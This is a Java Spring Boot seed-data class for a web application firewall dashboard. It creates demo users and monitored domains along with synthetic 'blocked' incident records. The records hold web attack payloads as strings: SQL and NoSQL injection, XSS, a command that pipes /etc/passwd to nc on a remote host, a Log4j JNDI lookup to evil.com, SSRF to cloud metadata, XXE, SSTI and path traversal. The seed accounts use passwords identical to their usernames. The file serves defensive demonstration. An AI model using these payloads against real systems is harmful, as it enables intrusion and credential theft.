package com.krish.sentinel_guard.config;

import com.krish.sentinel_guard.model.*;
import com.krish.sentinel_guard.repository.BannedIpRepository;
import com.krish.sentinel_guard.repository.MonitoredDomainRepository;
import com.krish.sentinel_guard.repository.SecurityIncidentRepository;
import com.krish.sentinel_guard.repository.UserAccountRepository;
import com.krish.sentinel_guard.service.DomainIntelligenceService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.CommandLineRunner;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.List;

@Component
public class DataInitializer implements CommandLineRunner {

    private static final Logger log = LoggerFactory.getLogger(DataInitializer.class);

    private final MonitoredDomainRepository domainRepository;
    private final SecurityIncidentRepository incidentRepository;
    private final BannedIpRepository bannedIpRepository;
    private final UserAccountRepository userRepository;
    private final PasswordEncoder passwordEncoder;
    private final DomainIntelligenceService domainIntelligenceService;

    public DataInitializer(
            MonitoredDomainRepository domainRepository,
            SecurityIncidentRepository incidentRepository,
            BannedIpRepository bannedIpRepository,
            UserAccountRepository userRepository,
            PasswordEncoder passwordEncoder,
            DomainIntelligenceService domainIntelligenceService) {
        this.domainRepository = domainRepository;
        this.incidentRepository = incidentRepository;
        this.bannedIpRepository = bannedIpRepository;
        this.userRepository = userRepository;
        this.passwordEncoder = passwordEncoder;
        this.domainIntelligenceService = domainIntelligenceService;
    }

    @Override
    public void run(String... args) {
        seedUsers();
        seedDomains();
        seedSampleIncidents();
        seedBannedIps();
        log.info("🛡️ SentinelGuard WAF & Threat Intelligence Platform initialized successfully.");
    }

    private void seedUsers() {
        if (userRepository.count() == 0) {
            userRepository.saveAll(List.of(
                new UserAccount("krishna", passwordEncoder.encode("krishna"), "Krishna Singamsetti", "krishna@singamsettikrishna.in", UserRole.ROLE_SUPER_ADMIN, "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150"),
                new UserAccount("alex", passwordEncoder.encode("alex"), "Alex Mercer", "alex@singamsettikrishna.in", UserRole.ROLE_SECURITY_ANALYST, "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150"),
                new UserAccount("sarah", passwordEncoder.encode("sarah"), "Sarah Connor", "sarah@singamsettikrishna.in", UserRole.ROLE_AUDITOR, "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150")
            ));
        }
    }

    private void seedDomains() {
        if (domainRepository.count() == 0) {
            MonitoredDomain d0 = new MonitoredDomain("sentinel-guard.singamsettikrishna.in", "SentinelGuard Production Hub", "140.245.250.50", "India", "Hostinger Operations, UAB");
            d0.setTotalRequests(2150L);
            d0.setBlockedRequests(114L);
            d0.setCleanRequests(2036L);
            d0.setHealthStatus("HEALTHY");

            MonitoredDomain d1 = new MonitoredDomain("usertesting.singamsettikrishna.in", "UserTesting Subdomain", "140.245.250.50", "India", "Hostinger Operations, UAB");
            d1.setTotalRequests(1420L);
            d1.setBlockedRequests(84L);
            d1.setCleanRequests(1336L);
            d1.setHealthStatus("HEALTHY");

            MonitoredDomain d2 = new MonitoredDomain("singamsettikrishna.in", "Primary Portfolio WebApp", "140.245.250.50", "India", "Hostinger Operations, UAB");
            d2.setTotalRequests(3850L);
            d2.setBlockedRequests(192L);
            d2.setCleanRequests(3658L);
            d2.setHealthStatus("HEALTHY");

            MonitoredDomain d3 = new MonitoredDomain("github.com", "GitHub Primary Gateway", "140.82.121.4", "United States", "MarkMonitor Inc.");
            d3.setTotalRequests(8500L);
            d3.setBlockedRequests(320L);
            d3.setCleanRequests(8180L);
            d3.setHealthStatus("HEALTHY");

            List<MonitoredDomain> saved = domainRepository.saveAll(List.of(d0, d1, d2, d3));

            // Asynchronously run initial real network scans (DNS, SSL, WHOIS) on startup
            Thread.ofVirtual().start(() -> {
                for (MonitoredDomain d : saved) {
                    try {
                        domainIntelligenceService.refreshDomainIntelligence(d.getId());
                    } catch (Exception e) {
                        log.debug("Initial background scan for {}: {}", d.getDomainName(), e.getMessage());
                    }
                }
            });
        }
    }

    private void seedSampleIncidents() {
        if (incidentRepository.count() == 0) {
            List<SecurityIncident> samples = new java.util.ArrayList<>(List.of(
                // Recent 24h Telemetry
                createIncident("usertesting.singamsettikrishna.in", "45.33.32.156", "United States", "US", "Dallas", "GET", "/api/users?id=1' OR 1=1--", ThreatType.SQL_INJECTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 95, "SQLI_ADMIN_BYPASS", "1' OR 1=1--", "Mozilla/5.0", 2),
                createIncident("singamsettikrishna.in", "185.220.101.5", "Germany", "DE", "Frankfurt", "POST", "/api/contact", ThreatType.XSS, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 90, "XSS_SCRIPT_TAG", "<script>alert(document.cookie)</script>", "Python-requests/2.28", 15),
                createIncident("usertesting.singamsettikrishna.in", "91.240.118.172", "Russia", "RU", "Moscow", "POST", "/api/v1/exec", ThreatType.REMOTE_CODE_EXECUTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "RCE_SYSTEM_RECON", "; cat /etc/passwd | nc 91.240.118.172 4444", "curl/7.88.1", 45),
                createIncident("singamsettikrishna.in", "103.152.220.40", "India", "IN", "Bangalore", "GET", "/images/../../../../etc/shadow", ThreatType.PATH_TRAVERSAL, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 90, "PATH_TRAVERSAL_DOT_DOT", "../../../../etc/shadow", "Mozilla/5.0", 90),
                createIncident("usertesting.singamsettikrishna.in", "194.26.29.112", "Netherlands", "NL", "Amsterdam", "POST", "/api/login", ThreatType.DOS_HTTP_FLOOD, ThreatSeverity.CRITICAL, ActionTaken.IP_BANNED, 95, "RULE_DDOS_RATE_LIMIT", "HTTP Flood: 120 req/sec burst", "Golang-HTTP-Client/1.1", 180),
                createIncident("singamsettikrishna.in", "114.119.130.82", "China", "CN", "Beijing", "GET", "/wp-login.php", ThreatType.SUSPICIOUS_SCANNER, ThreatSeverity.MEDIUM, ActionTaken.BLOCKED_403, 80, "RULE_MALICIOUS_SCANNER_UA", "Nikto/2.1.6 Vulnerability Scanner", "Nikto/2.1.6", 360),
                createIncident("usertesting.singamsettikrishna.in", "187.189.45.12", "Brazil", "BR", "São Paulo", "GET", "/api/v1/search?q=${jndi:ldap://evil.com/a}", ThreatType.REMOTE_CODE_EXECUTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "RCE_LOG4J_JNDI", "${jndi:ldap://evil.com/a}", "Mozilla/5.0", 600),
                createIncident("singamsettikrishna.in", "195.154.122.9", "France", "FR", "Paris", "POST", "/api/feedback", ThreatType.XSS, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 90, "XSS_SVG_VECTOR", "<svg/onload=alert('XSS')>", "Mozilla/5.0", 720),
                createIncident("usertesting.singamsettikrishna.in", "198.51.100.77", "United States", "US", "Ashburn", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", ThreatType.SSRF, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "SSRF_CLOUD_METADATA_EXFILTRATION", "http://169.254.169.254/latest/meta-data/", "Mozilla/5.0", 900),
                createIncident("singamsettikrishna.in", "193.106.191.10", "Bulgaria", "BG", "Sofia", "POST", "/api/xml/upload", ThreatType.XXE, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "XXE_EXTERNAL_ENTITY_DECLARATION", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "curl/8.1.2", 1100),
                createIncident("usertesting.singamsettikrishna.in", "185.191.171.4", "Poland", "PL", "Warsaw", "POST", "/render", ThreatType.SSTI, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "SSTI_JINJA2_PYTHON_EXPLOITATION", "{{ ''.__class__.__mro__[1].__subclasses__() }}", "Mozilla/5.0", 1300),
                createIncident("singamsettikrishna.in", "104.244.78.10", "United States", "US", "San Francisco", "POST", "/api/auth/login", ThreatType.NOSQL_INJECTION, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 95, "NOSQL_JSON_QUERY_BYPASS", "{\"password\": {\"$ne\": null}}", "Python-requests/2.31", 1400),
                createIncident("usertesting.singamsettikrishna.in", "154.16.248.88", "United Kingdom", "GB", "London", "POST", "/api/object/sync", ThreatType.DESERIALIZATION_ATTACK, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "DESERIALIZATION_POLYMORPHIC_JSON_AUTO_TYPE", "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"", "Go-http-client/2.0", 1430),

                // Historical 7-Day to 30-Day Window (August 2026)
                createIncidentHistorical("usertesting.singamsettikrishna.in", "198.51.100.12", "Canada", "CA", "Toronto", "GET", "/api/products?cat=electronics' UNION SELECT username,password FROM users--", ThreatType.SQL_INJECTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 98, "SQLI_UNION_EXTRACT", "UNION SELECT username,password FROM users--", "Mozilla/5.0", 3),
                createIncidentHistorical("singamsettikrishna.in", "45.154.255.89", "Romania", "RO", "Bucharest", "POST", "/submit/comment", ThreatType.XSS, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 92, "XSS_EVENT_HANDLER", "<img src=x onerror=alert(1)>", "Mozilla/5.0", 7),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "103.21.244.0", "Singapore", "SG", "Singapore", "POST", "/api/order/checkout", ThreatType.DOS_HTTP_FLOOD, ThreatSeverity.HIGH, ActionTaken.IP_BANNED, 90, "RULE_DDOS_RATE_LIMIT", "Burst: 180 req/sec", "Python-aiohttp/3.8", 14),
                createIncidentHistorical("singamsettikrishna.in", "194.87.139.11", "Russia", "RU", "Saint Petersburg", "GET", "/debug/vars", ThreatType.SUSPICIOUS_SCANNER, ThreatSeverity.LOW, ActionTaken.BLOCKED_403, 60, "SCANNER_DEBUG_ENDPOINT", "Exposed Debug Path", "sqlmap/1.7#stable", 21),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "80.94.95.12", "Netherlands", "NL", "Haarlem", "POST", "/upload/doc", ThreatType.XXE, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 96, "XXE_OOB_EXFILTRATION", "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">", "Mozilla/5.0", 28),

                // Historical 30-Day to 90-Day Window (June - July 2026)
                createIncidentHistorical("singamsettikrishna.in", "176.113.115.8", "Ukraine", "UA", "Kyiv", "POST", "/api/eval", ThreatType.REMOTE_CODE_EXECUTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "RCE_COMMAND_CHAINING", "test && id && uname -a", "curl/7.81.0", 42),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "193.32.162.5", "Seychelles", "SC", "Victoria", "GET", "/internal/proxy?target=http://localhost:8080/actuator/env", ThreatType.SSRF, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 95, "SSRF_ACTUATOR_PROBE", "http://localhost:8080/actuator/env", "Mozilla/5.0", 55),
                createIncidentHistorical("singamsettikrishna.in", "195.201.201.32", "Germany", "DE", "Falkenstein", "POST", "/api/v2/parse", ThreatType.DESERIALIZATION_ATTACK, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 99, "DESERIALIZATION_JAVA_PAYLOAD", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "CustomExploit/1.0", 68),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "185.156.74.120", "Bulgaria", "BG", "Varna", "GET", "/config/download?file=..%2f..%2f..%2fwindows%2fwin.ini", ThreatType.PATH_TRAVERSAL, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 94, "PATH_TRAVERSAL_URL_ENCODED", "..%2f..%2f..%2fwindows%2fwin.ini", "Mozilla/5.0", 82),

                // Historical 90-Day to 180-Day 6-Month Window (March - May 2026)
                createIncidentHistorical("singamsettikrishna.in", "185.220.101.44", "Germany", "DE", "Berlin", "GET", "/api/auth?user=admin%27%20OR%20%271%27=%271", ThreatType.SQL_INJECTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 95, "SQLI_BOOLEAN_BASED", "' OR '1'='1", "Mozilla/5.0", 105),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "91.240.118.5", "Russia", "RU", "Novosibirsk", "POST", "/api/search", ThreatType.NOSQL_INJECTION, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 90, "NOSQL_REGEX_INJECTION", "{\"$regex\": \".*\"}", "Python/3.10", 120),
                createIncidentHistorical("singamsettikrishna.in", "103.152.220.99", "India", "IN", "Mumbai", "GET", "/template?name={{7*7}}", ThreatType.SSTI, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 85, "SSTI_ARITHMETIC_PROBE", "{{7*7}}", "Mozilla/5.0", 135),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "194.26.29.200", "Netherlands", "NL", "Rotterdam", "POST", "/api/gateway/stream", ThreatType.DOS_HTTP_FLOOD, ThreatSeverity.CRITICAL, ActionTaken.IP_BANNED, 98, "RULE_DDOS_RATE_LIMIT", "Volumetric Syn/HTTP Flood", "Go-http-client/1.1", 150),
                createIncidentHistorical("singamsettikrishna.in", "114.119.130.12", "China", "CN", "Shanghai", "GET", "/admin/../../../../etc/passwd", ThreatType.PATH_TRAVERSAL, ThreatSeverity.HIGH, ActionTaken.BLOCKED_403, 90, "PATH_TRAVERSAL_ADMIN_ESCAPE", "../../../../etc/passwd", "Mozilla/5.0", 165),
                createIncidentHistorical("usertesting.singamsettikrishna.in", "45.33.32.201", "United States", "US", "Austin", "POST", "/api/v1/ping?host=127.0.0.1;whoami", ThreatType.REMOTE_CODE_EXECUTION, ThreatSeverity.CRITICAL, ActionTaken.BLOCKED_403, 100, "RCE_COMMAND_INJECTION", ";whoami", "curl/8.0.1", 175)
            ));
            incidentRepository.saveAll(samples);
            log.info("📊 Seeded {} historical security incidents across 6-month retention timeline.", samples.size());
        }
    }

    private void seedBannedIps() {
        if (bannedIpRepository.count() == 0) {
            bannedIpRepository.saveAll(List.of(
                new BannedIp("194.26.29.112", "Netherlands", "Automated HTTP Flood DDoS Rate Limit Exceeded", ThreatType.DOS_HTTP_FLOOD, 1800),
                new BannedIp("91.240.118.172", "Russia", "Active RCE Shell Injection Attempt (/etc/passwd)", ThreatType.REMOTE_CODE_EXECUTION, 3600),
                new BannedIp("114.119.130.82", "China", "Automated Vulnerability Scanner Probe (Nikto)", ThreatType.SUSPICIOUS_SCANNER, 1200),
                new BannedIp("198.51.100.77", "United States", "Active SSRF Cloud Metadata Exfiltration Attempt", ThreatType.SSRF, 2400)
            ));
        }
    }

    private SecurityIncident createIncident(String domain, String ip, String country, String code, String city, String method,
                                            String path, ThreatType type, ThreatSeverity sev, ActionTaken act, int score,
                                            String rule, String payload, String ua, long minutesAgo) {
        SecurityIncident inc = new SecurityIncident(domain, ip, type, sev, act, score, rule, payload, method, path);
        inc.setClientCountry(country);
        inc.setClientCountryCode(code);
        inc.setClientCity(city);
        inc.setUserAgent(ua);
        inc.setTimestamp(LocalDateTime.now().minusMinutes(minutesAgo));
        return inc;
    }

    private SecurityIncident createIncidentHistorical(String domain, String ip, String country, String code, String city, String method,
                                                      String path, ThreatType type, ThreatSeverity sev, ActionTaken act, int score,
                                                      String rule, String payload, String ua, long daysAgo) {
        SecurityIncident inc = new SecurityIncident(domain, ip, type, sev, act, score, rule, payload, method, path);
        inc.setClientCountry(country);
        inc.setClientCountryCode(code);
        inc.setClientCity(city);
        inc.setUserAgent(ua);
        // Add random hours & minutes within that day
        inc.setTimestamp(LocalDateTime.now().minusDays(daysAgo).minusHours((long)(Math.random() * 20)).minusMinutes((long)(Math.random() * 50)));
        return inc;
    }
}
